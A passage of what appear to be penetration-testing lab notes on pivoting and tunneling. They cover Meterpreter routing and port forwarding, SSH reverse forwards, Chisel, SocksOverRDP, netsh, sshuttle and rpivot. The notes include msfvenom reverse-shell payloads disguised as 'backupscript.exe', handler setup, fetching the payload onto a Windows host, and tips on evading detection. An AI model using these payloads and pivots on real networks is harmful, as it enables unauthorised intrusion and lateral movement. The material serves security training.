network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the <code>ping_sweep</code> module, which will generate the ICMP traffic from the Ubuntu host to the network <code>172.16.5.0/23</code>.</p> <pre><code>meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23\n\n[*] Performing ping sweep for IP range 172.16.5.0/23\n</code></pre> <p>We could also perform a ping sweep using a <code>for loop</code> directly on a target pivot host that will ping any device in the network range we specify. </p> <pre><code># Ping Sweep For Loop on Linux Pivot Hosts\nfor i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n</code></pre> <pre><code># Ping Sweep For Loop Using CMD\nfor /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"\n</code></pre> <pre><code># Ping Sweep Using PowerShell\n1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}\n</code></pre>  <p>Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built. </p>  <p>If a host's firewall blocks ping (ICMP), the ping won't get us successful replies. In these cases, we can perform a TCP scan on the network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module <code>socks_proxy</code> to configure a local proxy on our attack host. We will configure the SOCKS proxy for <code>SOCKS version 4a</code>. This SOCKS configuration will start a listener on port <code>9050</code> and route all the traffic received via our Meterpreter session.</p> <pre><code>msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050\nSRVPORT =&gt; 9050\nmsf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0\nSRVHOST =&gt; 0.0.0.0\nmsf6 auxiliary(server/socks_proxy) &gt; set version 4a\nversion =&gt; 4a\nmsf6 auxiliary(server/socks_proxy) &gt; run\n[*] Auxiliary module running as background job 0.\n\n[*] Starting the SOCKS proxy server\nmsf6 auxiliary(server/socks_proxy) &gt; options\n\nModule options (auxiliary/server/socks_proxy):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SRVHOST  0.0.0.0          yes       The address to listen on\n   SRVPORT  9050             yes       The port to listen on\n   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,\n                                        5)\n\n\nAuxiliary action:\n\n   Name   Description\n   ----   -----------\n   Proxy  Run a SOCKS proxy server\n</code></pre> <p>Confirming Proxy Server is Running <pre><code>msf6 auxiliary(server/socks_proxy) &gt; jobs\n\nJobs\n====\n\n  Id  Name                           Payload  Payload opts\n  --  ----                           -------  ------------\n  0   Auxiliary: server/socks_proxy\n</code></pre></p> <p>After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host.</p> <p>Adding to <code>proxychains.conf</code> if needed <pre><code>socks4  127.0.0.1 9050\n</code></pre></p> <p>Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the <code>post/multi/manage/autoroute</code> module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.</p> <pre><code>msf6 &gt; use post/multi/manage/autoroute\n\nmsf6 post(multi/manage/autoroute) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0\nSUBNET =&gt; 172.16.5.0\nmsf6 post(multi/manage/autoroute) &gt; run\n\n[!] SESSION may not be compatible with this module:\n[!]  * incompatible session platform: linux\n[*] Running module against 10.129.202.64\n[*] Searching for subnets to autoroute.\n[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.\n[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.\n[*] Post module execution completed\n</code></pre> <p>It is also possible to add routes with autoroute by running autoroute from the Meterpreter session. <pre><code>meterpreter &gt; run autoroute -s 172.16.5.0/23\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n[*] Adding a route to 172.16.5.0/255.255.254.0...\n[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64\n[*] Use the -p option to list all active routes\n</code></pre></p> <p>After adding the necessary route(s) we can use the <code>-p</code> option to list the active routes to make sure our configuration is applied as expected.</p> <pre><code>meterpreter &gt; run autoroute -p\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n\nActive Routing Table\n====================\n\n   Subnet             Netmask            Gateway\n   ------             -------            -------\n   10.129.0.0         255.255.0.0        Session 1\n   172.16.4.0         255.255.254.0      Session 1\n   172.16.5.0         255.255.254.0      Session 1\n</code></pre> <p>Testing Proxy &amp; Routing Functionality <pre><code>secops@kali[/kali]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn\n\nProxyChains-3.1 (http://proxychains.sf.net)\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST\nInitiating Parallel DNS resolution of 1 host. at 13:40\nCompleted Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed\nInitiating Connect Scan at 13:40\nScanning 172.16.5.19 [1 port]\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19 :3389-&lt;&gt;&lt;&gt;-OK\nDiscovered open port 3389/tcp on 172.16.5.19\nCompleted Connect Scan at 13:40, 0.12s elapsed (1 total ports)\nNmap scan report for 172.16.5.19 \nHost is up (0.12s latency).\n\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.45 seconds\n</code></pre></p>  Port Forwarding <p>Can also be accomplished using Meterpreter's <code>portfwd</code> module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.</p> <p>Creating Local TCP Relay <pre><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19\n\n[*] Local TCP relay created: :3300 &lt;-&gt; 172.16.5.19:3389\n</code></pre></p> <p>The above command requests the Meterpreter session to start a listener on our attack host's local port (<code>-l</code>) <code>3300</code> and forward all the packets to the remote (<code>-r</code>) Windows server <code>172.16.5.19</code> on <code>3300</code> port (<code>-p</code>) via our Meterpreter session.</p> <p>Connecting to Windows Target through localhost <pre><code>secops@kali[/kali]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123\n</code></pre></p> <p>We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established. <pre><code>secops@kali[/kali]$ netstat -antp\n\ntcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp \n</code></pre></p>  Meterpreter Reverse Port Forwarding <p>Similar to local port forwards, Metasploit can also perform <code>reverse port forwarding</code> with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. </p> <p>We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port <code>1234</code> running on the Ubuntu server to our attack host on local port (<code>-l</code>) <code>8081</code>. We will also configure our listener to listen on port 8081 for a Windows shell.</p> <pre><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18\n\n[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234\n</code></pre> <pre><code>meterpreter &gt; bg\n\n[*] Backgrounding session 1...\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set LPORT 8081 \nLPORT =&gt; 8081\nmsf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0 \nLHOST =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 0.0.0.0:8081 \n</code></pre> <p>We can now create a reverse shell payload that will send a connection back to our Ubuntu server on <code>172.16.5.129</code>:<code>1234</code> when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to <code>attack host's ip</code>:<code>8081</code> that we configured.</p> <pre><code>secops@kali[/kali]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: backupscript.exe\n</code></pre> <p>If we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server. <pre><code>[*] Started reverse TCP handler on 0.0.0.0:8081 \n[*] Sending stage (200262 bytes) to 10.10.14.18\n[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500\n\nmeterpreter &gt; shell\nProcess 2336 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.1637]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\&gt;\n</code></pre></p>","title":"Meterpreter Tunneling & Port Forwarding"},{"location":"ptpf/rdp_socks_tunneling_socksoverrdp/","text":"<p>There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. SocksOverRDP is an example of a tool that uses <code>Dynamic Virtual Channels</code> (<code>DVC</code>) from the Remote Desktop Service feature of Windows. This feature can also be used to tunnel arbitrary packets over the network.</p> <p>We need:</p> <ol> <li> <p>SocksOverRDP x64 Binaries</p> </li> <li> <p>Proxifier Portable Binary</p> </li> </ol> <ul> <li>We can look for <code>ProxifierPE.zip</code> </li> </ul> <p>Connect to target and copy <code>SocksOverRDPx64.zip</code>file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.</p> <pre><code>C:\\Users\\user\\Desktop\\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll\n</code></pre> <p>Now we can connect to 172.16.5.19 over RDP using <code>mstsc.exe</code>, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. Use the credentials to connect to 172.16.5.19.</p> <p>We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.</p> <p>When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080. <pre><code>C:\\Users\\user\\Desktop\\SocksOverRDP-x64&gt; netstat -antb | findstr 1080\n\n  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING \n</code></pre></p> <p>After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port.</p> <p></p> <p>With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.</p>","title":"RDP and SOCKS Tunneling w/ SocksOverRDP"},{"location":"ptpf/remote_reverse_port_forwarding_ssh/","text":"<p>There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to <code>upload</code>/<code>download</code> files (when the RDP clipboard is disabled), <code>use exploits</code> or <code>low-level Windows API</code> using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in Windows executables.</p>  Creating a Windows Payload with msfvenom <pre><code>secops@kali[/kali]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 712 bytes\nFinal size of exe file: 7168 bytes\nSaved as: backupscript.exe\n</code></pre> <p>Configuring &amp; Starting the multi/handler <pre><code>msf6 &gt; use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https\npayload =&gt; windows/x64/meterpreter/reverse_https\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 8000\nlport =&gt; 8000\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started HTTPS reverse handler on https://0.0.0.0:8000\n</code></pre></p> <p>Transferring Payload to Pivot Host <pre><code>secops@kali[/kali]$ scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/\n\nbackupscript.exe   \n</code></pre></p> <p>After copying the payload, we will start a <code>python3 HTTP server</code> <pre><code>ubuntu@Webserver$ python3 -m http.server 8123\n</code></pre></p> <p>Download the Payload through IWR</p> <pre><code>PS C:\\Windows\\system32&gt; Invoke-WebRequest -Uri \"http://172.16.5.129:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"\n</code></pre> <p>Once we have our payload downloaded on the Windows host, we will use <code>SSH remote port forwarding</code> to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use <code>-vN</code> argument in our SSH command to make it verbose and ask it not to prompt the login shell. The <code>-R</code> command asks the Ubuntu server to listen on <code>&lt;targetIPaddress&gt;:8080</code> and forward all incoming connections on port <code>8080</code> to our msfconsole listener on <code>0.0.0.0:8000</code> of our <code>attack host</code>.</p> <pre><code>secops@kali[/kali]$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN\n</code></pre> <p>After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.</p> <pre><code>ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355\ndebug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5\ndebug1: channel 1: new [172.16.5.19]\ndebug1: confirm forwarded-tcpip\ndebug1: channel 0: free: 172.16.5.19, nchannels 2\ndebug1: channel 1: connected to 0.0.0.0 port 8000\ndebug1: channel 1: free: 172.16.5.19, nchannels 1\ndebug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768\ndebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356\ndebug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4\ndebug1: channel 0: new [172.16.5.19]\ndebug1: confirm forwarded-tcpip\ndebug1: channel 0: connected to 0.0.0.0 port 8000\n</code></pre> <p>If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server. <pre><code>[*] Started HTTPS reverse handler on https://0.0.0.0:8000\n[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!\n[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...\n[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!\n[*] Meterpreter session 1 opened (127.0.0.1:8000 -&gt; 127.0.0.1 ) at 2022-03-02 10:48:10 -0500\n\nmeterpreter &gt; shell\nProcess 3236 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.1637]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\&gt;\n</code></pre></p>","title":"Remote/Reverse Port Forwarding w/ SSH"},{"location":"ptpf/socks5_tunneling_chisel/","text":"<p>Chisel is a TCP/UDP-based tunneling tool that uses HTTP to transport data that is secured using SSH. <code>Chisel</code> can create a client-server tunnel connection in a firewall restricted environment.</p> <p>Scenario: We have to tunnel our traffic to a webserver on the <code>172.16.5.0</code>/<code>23</code> network (internal network). We have the Domain Controller with the address <code>172.16.5.19</code>. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/jpillora/chisel.git\n</code></pre> <pre><code>secops@kali[/kali]$ cd chisel &amp;&amp; go build\n</code></pre> <pre><code>secops@kali[/kali]$ scp chisel ubuntu@10.129.202.64:~/\n\nubuntu@10.129.202.64's password: \nchisel                                        100%   11MB   1.2MB/s   00:09    \n</code></pre> <p>Running the Chisel Server on the Pivot Host <pre><code>ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5\n\n2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=\n2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234\n</code></pre></p> <p>The Chisel listener will listen for incoming connections on port <code>1234</code> using SOCKS5 (<code>--socks5</code>) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.</p> <p>Start a client on our attack host and connect to the Chisel server</p> <pre><code>secops@kali[/kali]$ ./chisel client -v 10.129.202.64:1234 socks\n\n2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234\n2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening\n2022/05/05 14:21:18 client: tun: Bound proxies\n2022/05/05 14:21:19 client: Handshaking...\n2022/05/05 14:21:19 client: Sending config\n2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)\n2022/05/05 14:21:19 client: tun: SSH connected\n</code></pre> <p>The Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file and add <code>1080</code> port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.</p> <pre><code>secops@kali[/kali]$ tail -f /etc/proxychains.conf \n\n#\n#       proxy types: http, socks4, socks5\n#        ( auth types supported: \"basic\"-http  \"user/pass\"-socks )\n#\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\n# socks4    127.0.0.1 9050\nsocks5 127.0.0.1 1080\n</code></pre> <p>Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p>  Chisel Reverse Pivot <p>There may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.</p> <p>When the Chisel server has <code>--reverse</code> enabled, remotes can be prefixed with <code>R</code> to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying <code>R:socks</code> will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.</p> <p>Start the server in our attack host with the option <code>--reverse</code></p> <pre><code>secops@kali[/kali]$ sudo ./chisel server --reverse -v -p 1234 --socks5\n\n2022/05/30 10:19:16 server: Reverse tunnelling enabled\n2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=\n2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234\n</code></pre> <p>Connect from the pivot host to our attack host, using the option <code>R:socks</code></p> <pre><code>ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks\n\n2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234\n2022/05/30 14:19:29 client: Handshaking...\n2022/05/30 14:19:30 client: Sending config\n2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)\n2022/05/30 14:19:30 client: tun: SSH connected\n</code></pre> <p>Editing &amp; Confirming proxychains.conf <pre><code>secops@kali[/kali]$ tail -f /etc/proxychains.conf \n\n[ProxyList]\n# add proxy here ...\n# socks4    127.0.0.1 9050\nsocks5 127.0.0.1 1080 \n</code></pre></p> <p>If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p>","title":"SOCKS5 Tunneling with Chisel"},{"location":"ptpf/obstacles/port_forwarding_windows_netsh/","text":"<p>E.g. compromised a Windows 10 host, which would allow to pivor further from within the network the workstation is in.</p> <p>We can use <code>netsh.exe</code> to forward all data received on a specific port (say 8080) to a remote host on a remote port.</p> <pre><code>C:\\Windows\\system32&gt; netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25\n</code></pre> <p>Verifying Port Forward <pre><code>C:\\Windows\\system32&gt; netsh.exe interface portproxy show v4tov4\n\nListen on ipv4:             Connect to ipv4:\n\nAddress         Port        Address         Port\n--------------- ----------  --------------- ----------\n10.129.42.198   8080        172.16.5.25     3389\n</code></pre></p> <p>After configuring the <code>portproxy</code> on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.</p> <p></p>","title":"Port Forwarding Windows: Netsh"},{"location":"ptpf/obstacles/ssh_for_win_plink/","text":"<p>Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer. </p> <p>The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.</p> <p>Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created.</p> <p></p> <p>After configuring the SOCKS server for <code>127.0.0.1</code> and port 9050, we can directly start <code>mstsc.exe</code> to start an RDP session with a Windows target that allows RDP connections.</p>","title":"SSH for Windows: plink"},{"location":"ptpf/obstacles/ssh_pivoting_sshuttle/","text":"<p>Sshuttle is another tool which removes the need to configure proxychains. This tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers.</p> <p>We don't need to use proxychains to connect to the remote hosts.</p> <pre><code>secops@kali[/kali]$ sudo apt-get install sshuttle\n\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\n&lt;SNIP&gt;\n...\n</code></pre> <p>We specify the option <code>-r</code> to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.</p> <pre><code>secops@kali[/kali]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v \n\nStarting sshuttle proxy (version 1.1.0).\nc : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']\nfw: Starting firewall with Python version 3.9.2\nfw: ready method name nat.\nc : IPv6 enabled: Using default IPv6 listen address ::1\nc : Method: nat\nc : IPv4: on\nc : IPv6: on\nc : UDP : off (not available with nat method)\nc : DNS : off (available)\nc : User: off (available)\nc : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):\nc :   (&lt;AddressFamily.AF_INET: 2&gt;, '172.16.5.0', 32, 0, 0)\nc : Subnets to exclude from forwarding:\nc :   (&lt;AddressFamily.AF_INET: 2&gt;, '127.0.0.1', 32, 0, 0)\nc :   (&lt;AddressFamily.AF_INET6: 10&gt;, '::1', 128, 0, 0)\nc : TCP redirector listening on ('::1', 12300, 0, 0).\nc : TCP redirector listening on ('127.0.0.1', 12300).\nc : Starting client with Python version 3.9.2\nc : Connecting to server...\nubuntu@10.129.202.64's password: \n s: Running server on remote host with /usr/bin/python3 (version 3.8.10)\n s: latency control setting = True\n s: auto-nets:False\nc : Connected to server.\nfw: setting up.\nfw: ip6tables -w -t nat -N sshuttle-12300\nfw: ip6tables -w -t nat -F sshuttle-12300\nfw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300\nfw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300\nfw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL\nfw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp\nfw: iptables -w -t nat -N sshuttle-12300\nfw: iptables -w -t nat -F sshuttle-12300\nfw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300\nfw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300\nfw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL\nfw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp\nfw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300\n</code></pre> <p>With this command, sshuttle creates an entry in our <code>iptables</code> to redirect all traffic to the 172.16.5.0/23 network through the pivot host.</p> <pre><code>secops@kali[/kali]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn\n\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:16 EST\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating Parallel DNS resolution of 1 host. at 11:16\nCompleted Parallel DNS resolution of 1 host. at 11:16, 0.15s elapsed\nInitiating Connect Scan at 11:16\nScanning 172.16.5.19 [1 port]\nCompleted Connect Scan at 11:16, 2.00s elapsed (1 total ports)\nInitiating Service scan at 11:16\nNSE: Script scanning 172.16.5.19.\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nNmap scan report for 172.16.5.19\nHost is up.\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: LEGALCORP\n|   NetBIOS_Domain_Name: LEGALCORP\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: legalcorp.local\n|   DNS_Computer_Name: DC01.legalcorp.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2022-08-14T02:58:25+00:00\n|_ssl-date: 2022-08-14T02:58:25+00:00; +7s from scanner time.\n| ssl-cert: Subject: commonName=DC01.legalcorp.local\n| Issuer: commonName=DC01.legalcorp.local\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2022-08-13T02:51:48\n| Not valid after:  2023-02-12T02:51:48\n| MD5:   58a1 27de 5f06 fea6 0e18 9a02 f0de 982b\n|_SHA-1: f490 dc7d 3387 9962 745a 9ef8 8c15 d20e 477f 88cb\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6s, deviation: 0s, median: 6s\n\n\nNSE: Script Post-scanning.\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nInitiating NSE at 11:16\nCompleted NSE at 11:16, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.07 seconds\n</code></pre>","title":"SSH Pivoting w/ Sshuttle"},{"location":"ptpf/obstacles/webserver_pivoting_rpivot/","text":"<p>Rpivot is a reverse SOCKS proxy tool for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.</p> <p>We can start our rpivot SOCKS proxy server to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.</p> <pre><code>secops@kali[/kali]$ sudo git clone https://github.com/klsecservices/rpivot.git\n</code></pre> <pre><code>secops@kali[/kali]$ sudo apt-get install python2.7\n</code></pre> <p>We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using <code>server.py</code>.</p> <p>Running server.py from the Attack Host <pre><code>secops@kali[/kali]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0\n</code></pre></p> <p>Transfering rpivot to the Target <pre><code>secops@kali[/kali]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/\n</code></pre></p> <p>Running client.py from Pivot Target <pre><code>ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999\n\nBackconnecting to server 10.10.14.18 port 9999\n</code></pre></p> <p>Confirming Connection is Established <pre><code>New connection from host 10.129.202.64, source port 35226\n</code></pre></p> <p>We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.</p> <p>We should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.</p> <p>Browsing to the Target Webserver using Proxychains <pre><code>proxychains firefox-esr 172.16.5.135:80\n</code></pre></p>  <p>Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:</p> <p>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth <pre><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 